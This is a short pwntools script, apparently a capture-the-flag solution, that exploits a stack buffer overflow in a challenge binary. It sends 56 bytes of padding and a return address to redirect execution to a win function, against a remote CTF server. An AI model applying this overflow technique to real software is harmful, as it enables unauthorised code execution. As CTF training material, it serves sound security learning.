#!/usr/bin/env python3
from pwn import *

exe = './chall'
elf = ELF("./chall")

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# p = start()
p=remote("gc1.eng.run", 30980)

#Simple ret2win with arguments to function
p.sendline(b"A"*(56) + p32(0x0804937c) + p32(elf.sym.main)+ p32(0xdeadbeef))

p.interactive()

